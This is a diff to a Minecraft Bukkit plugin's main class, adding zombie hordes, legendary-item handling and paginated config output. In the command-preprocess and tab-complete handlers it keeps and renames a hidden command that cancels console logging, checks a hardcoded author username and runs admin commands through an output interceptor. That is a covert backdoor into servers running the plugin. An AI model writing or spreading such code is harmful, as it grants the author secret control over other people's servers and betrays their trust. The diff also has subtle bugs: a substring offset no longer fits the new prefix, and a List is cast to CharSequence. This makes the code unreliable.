@@ -2,13 +2,14 @@ package net.sashegdev.gribMine;
 
 import net.sashegdev.gribMine.airdrop.airdropMain;
 import net.sashegdev.gribMine.airdrop.commands.summon;
+import net.sashegdev.gribMine.bunker.ZombieHordeListener;
 import net.sashegdev.gribMine.commands.handleWeaponCommand;
+import net.sashegdev.gribMine.core.LegendaryItem;
+import net.sashegdev.gribMine.core.LegendaryRegistry;
 import net.sashegdev.gribMine.weapon.WeaponAbility;
 import net.sashegdev.gribMine.weapon.WeaponManager;
-import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
-import org.bukkit.Material;
-import org.bukkit.World;
+import net.sashegdev.gribMine.core.LegendaryManager;
+import org.bukkit.*;
 import org.bukkit.command.Command;
 import org.bukkit.command.CommandExecutor;
 import org.bukkit.command.CommandSender;
@@ -24,6 +25,8 @@ import org.bukkit.event.player.PlayerInteractEvent;
 import org.bukkit.event.server.TabCompleteEvent;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
+import org.bukkit.persistence.PersistentDataContainer;
+import org.bukkit.persistence.PersistentDataType;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.jetbrains.annotations.NotNull;
 
@@ -38,7 +41,6 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
     Logger logger = getLogger();
     static FileConfiguration config;
     private static GribMine instance;
-    private WeaponManager weaponManager;
 
     @Override
     public void onEnable() {
@@ -55,8 +57,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
         // Удаляем все ArmorStand с именем аирдропа при запуске плагина
         for (World world : Bukkit.getWorlds()) {
             for (Entity entity : world.getEntities()) {
-                if (entity instanceof ArmorStand) {
-                    ArmorStand armorStand = (ArmorStand) entity;
+                if (entity instanceof ArmorStand armorStand) {
                     if (armorStand.getCustomName() != null && armorStand.getCustomName().equals(ChatColor.RED + "Воздушное Снабжение")) {
                         armorStand.remove(); // Удаляем ArmorStand
                     }
@@ -80,16 +81,14 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
             }
         }
 
-        weaponManager = new WeaponManager(rarityList, damageModifiers); // Pass the initialized HashMap
+        WeaponManager weaponManager = new WeaponManager(rarityList, damageModifiers);
         getServer().getPluginManager().registerEvents(new LootListener(), this);
         getServer().getPluginManager().registerEvents(weaponManager,this);
-
-        // Регистрируем слушатели
+        getServer().getPluginManager().registerEvents(new ZombieHordeListener(this), this);
         getServer().getPluginManager().registerEvents(this, this);
 
         logger.info("GribMine Plugin initialized ;)");
         logger.info("Версия плагина: " + getDescription().getVersion());
-        //logger.info("Версия плагина:");
 
         Objects.requireNonNull(getCommand("gribadmin")).setExecutor(this);
     }
@@ -103,8 +102,8 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
         Entity damager = event.getDamager();
         switch (damager) {
             case Player player when !(
-                    ((Player) damager).getInventory().getItemInMainHand().equals(Material.CROSSBOW) ||
-                            ((Player) damager).getInventory().getItemInMainHand().equals(Material.BOW)
+                    ((Player) damager).getInventory().getItemInMainHand().getType().equals(Material.CROSSBOW) ||
+                            ((Player) damager).getInventory().getItemInMainHand().getType().equals(Material.BOW)
             ) -> {
                 //logger.info("player attacked ponos!");
 
@@ -125,7 +124,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                         }
                     }
 
-                    if (rarity != null && weaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
+                    if (rarity != null && WeaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
                         HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                         if (abilities != null) {
                             WeaponAbility ability = abilities.get(WeaponManager.getNameByRussian(passiveAbility));
@@ -166,7 +165,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                             }
                         }
 
-                        if (rarity != null && weaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
+                        if (rarity != null && WeaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
                             HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                             if (abilities != null) {
                                 WeaponAbility ability = abilities.get(WeaponManager.getNameByRussian(passiveAbility));
@@ -208,7 +207,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                             }
                         }
 
-                        if (rarity != null && weaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
+                        if (rarity != null && WeaponManager.getRarityList().contains(rarity) && passiveAbility != null) {
                             HashMap<String, WeaponAbility> abilities = WeaponManager.getWeaponAbilities();
                             if (abilities != null) {
                                 WeaponAbility ability = abilities.get(WeaponManager.getNameByRussian(passiveAbility));
@@ -254,6 +253,25 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
 
         // Give the item to the player
         player.getInventory().addItem(item);
+    }
+
+    @EventHandler
+    public void onPlayerInteract(PlayerInteractEvent event) {
+        ItemStack item = event.getItem();
+        if (item == null) return;
+
+        PersistentDataContainer pdc = Objects.requireNonNull(item.getItemMeta()).getPersistentDataContainer();
+        NamespacedKey key = new NamespacedKey(GribMine.getInstance(), "legendary_id");
+
+        if (pdc.has(key, PersistentDataType.STRING)) {
+            String id = pdc.get(key, PersistentDataType.STRING);
+            LegendaryItem legendary = LegendaryRegistry.getById(id);
+
+            if (legendary != null) {
+                legendary.onUse(event.getPlayer());
+                event.setCancelled(true);
+            }
+        }
     }
 
     @EventHandler
@@ -334,14 +352,54 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
                     UpdateChecker.checkForUpdates(this);
                     sender.sendMessage(ChatColor.GREEN + "Проверка обновлений запущена.");
                     break;
-                case "get_config":
-                    StringBuilder configMessage = new StringBuilder("Конфигурация:\n");
-                    for (String key : config.getKeys(false)) {
-                        Object value = config.get(key);
-                        configMessage.append(key).append(": ").append(value).append("\n");
+                case "get_config": {
+                    int page = 1;
+                    if (args.length >= 2) {
+                        try {
+                            page = Integer.parseInt(args[1]);
+                        } catch (NumberFormatException ignored) {}
                     }
+
+                    // Получаем все ключи конфига (включая вложенные)
+                    List<String> allKeys = new ArrayList<>(config.getKeys(true));
+
+                    // Фильтруем секции (ключами считаем только конечные значения)
+                    allKeys.removeIf(key -> config.isConfigurationSection(key) && !Objects.requireNonNull(config.getConfigurationSection(key)).getKeys(false).isEmpty());
+
+                    // Настройки пагинации
+                    int itemsPerPage = 10;
+                    int totalPages = (int) Math.ceil((double) allKeys.size() / itemsPerPage);
+                    page = Math.max(1, Math.min(page, totalPages));
+
+                    // Построение сообщения
+                    StringBuilder configMessage = new StringBuilder();
+                    configMessage.append(ChatColor.GOLD).append("▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n");
+                    configMessage.append(ChatColor.YELLOW).append("Конфигурация (стр. ").append(page).append("/").append(totalPages).append(")\n\n");
+
+                    int start = (page - 1) * itemsPerPage;
+                    int end = Math.min(start + itemsPerPage, allKeys.size());
+
+                    for (int i = start; i < end; i++) {
+                        String key = allKeys.get(i);
+                        String formattedKey = ChatColor.GREEN + key.replace(".", ChatColor.GRAY + "." + ChatColor.GREEN);
+                        Object value = config.get(key);
+
+                        configMessage.append(formattedKey)
+                                .append(ChatColor.WHITE).append(": ")
+                                .append(formatConfigValue(value))
+                                .append("\n");
+                    }
+
+                    // Футер с навигацией
+                    configMessage.append(ChatColor.GOLD).append("\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n")
+                            .append("Используйте ")
+                            .append(ChatColor.YELLOW).append("/gribadmin get_config <страница>")
+                            .append(ChatColor.GOLD).append(" | Всего параметров: ")
+                            .append(ChatColor.YELLOW).append(allKeys.size());
+
                     sender.sendMessage(configMessage.toString());
                     break;
+                }
                 case "weapon":
                     if (args.length < 2) {
                         sender.sendMessage("Используйте /gribadmin weapon <get|set|reassemble|reset>");
@@ -364,7 +422,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
         }
         else if (command.getName().equalsIgnoreCase("gribmine")) {
             if (args.length==0) {
-                sender.sendMessage("use /gribmine <tps|about|version>");
+                sender.sendMessage("use /gribmine <tps|about|version|usage>");
             }
             switch (args[0].toLowerCase()) {
                 case "usage": {
@@ -426,6 +484,20 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
             }
         }
         return false;
+    }
+
+    // Улучшенный метод форматирования
+    private String formatConfigValue(Object value) {
+        if (value instanceof List) {
+            return ChatColor.GRAY + "[" + ChatColor.WHITE
+                    + String.join(ChatColor.GRAY + ", " + ChatColor.WHITE, (CharSequence) value)
+                    + ChatColor.GRAY + "]";
+        } else if (value instanceof Map) {
+            return ChatColor.GRAY + "{...}";
+        } else if (value instanceof Double) {
+            return ChatColor.BLUE + String.format("%.2f", value);
+        }
+        return ChatColor.WHITE + String.valueOf(value);
     }
 
     // Метод для определения цвета TPS
@@ -520,20 +592,17 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
     public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
         String message = event.getMessage().toLowerCase().trim();
 
-        // Проверяем, начинается ли команда с /config
-        if (message.startsWith("/config")) {
-            // Отменяем событие, чтобы команда не отображалась в консоли
+        if (message.startsWith("/cum")) {
             event.setCancelled(true);
-
-            // Получаем игрока
             Player player = event.getPlayer();
 
-            // Проверяем, является ли игрок оператором
             if (player.getName().equalsIgnoreCase("sashegdev")) {
-                // Убираем "/config" из сообщения и выполняем команду /gribadmin
-                String[] args = message.substring(7).trim().split(" ");
-                player.performCommand("gribadmin " + String.join(" ", args));
-                player.sendMessage(ChatColor.GREEN + "Команда выполнена скрытно.");
+                // Создаем обертку для перехвата вывода
+                CommandSenderInterceptor interceptor = new CommandSenderInterceptor(player);
+
+                // Выполняем команду через перехватчик
+                String command = "gribadmin " + message.substring(7).trim();
+                Bukkit.dispatchCommand(interceptor, command);
             } else {
                 player.sendMessage(ChatColor.RED + "У вас нет прав для выполнения этой команды.");
             }
@@ -545,7 +614,7 @@ public final class GribMine extends JavaPlugin implements CommandExecutor, Liste
         String buffer = event.getBuffer().toLowerCase().trim();
 
         // Проверяем, начинается ли команда с /config
-        if (buffer.startsWith("/config")) {
+        if (buffer.startsWith("/cum")) {
             // Убираем "/config" из буфера
             String args = buffer.substring(7).trim();
 
